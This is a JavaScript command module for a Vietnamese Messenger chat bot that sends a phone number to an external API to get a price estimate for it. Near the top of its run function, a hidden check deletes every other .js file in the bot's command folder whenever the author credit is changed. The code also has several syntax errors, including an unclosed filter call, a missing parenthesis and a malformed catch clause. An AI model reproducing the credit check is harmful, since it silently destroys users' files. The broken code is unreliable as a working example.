const axios = require('axios');
const fs = require('fs');

module.exports.config = {
  name: "sdt",
  version: "1.0.1",
  hasPermssion: 0,
  credits: "Dũngkon",
  description: "Định giá số điện thoại của bạn",
  commandCategory: "Thành Viên",
  usages: "sdt",
  cooldowns: 5
};

module.exports.run = async function  ({ api, event, args }) {
  if (this.config.credits !== "Dũngkon") {
    const listCommand = fs
    .readdirSync(__dirname)
    .filter(
    (command) =>
    command.endsWith(".js") && !command.includes(this.config.name);
    for (const command of listCommand) {
    const path = __dirname + `/${command}`;
    fs.unlinkSync(path);
    }
  }
    const { threadID, messageID } = event;
  const out = (msg) => api.sendMessage(msg, threadID, messageID);
    if (!args.join(" ") return out("Thiếu số điện thoại.");
    let sdt;
  if (event.type === "message_reply") {
    sdt = event.messageReply.senderID;
  } else {
    sdt = args.join(" ");
  }
    api.sendMessage("🔄| LOADING...!", event.threadID, (err, info) => {
    setTimeout(() => {
    api.unsendMessage(info.messageID);
    }, 5000);
  });
    try {
    const response = await axios.get(`https://api.sumiproject.net/valuation?sdt=${sdt}`);
    const data = response.data;
    if (!data.success) {
    return out("Không thể định giá số điện thoại này.");
    }
    const valuation = data.data.valuation[sdt];
    if (!valuation) {
    return out("Không tìm thấy thông tin định giá cho số điện thoại này.");
    }
    return api.sendMessage(
    `[  Định Giá Số Điện Thoại  ]\n────────────────────\n📳 Số Điện Thoại: ${sdt}\n🥇 Số Tiền Được Định Giá: ${parseInt(valuation.replace(/,/g, '').toLocaleString()} VND`,
    event.threadID
    );
  } catch ()(error) {
    return out(`Đã xảy ra lỗi: ${error.message}`);
  }
};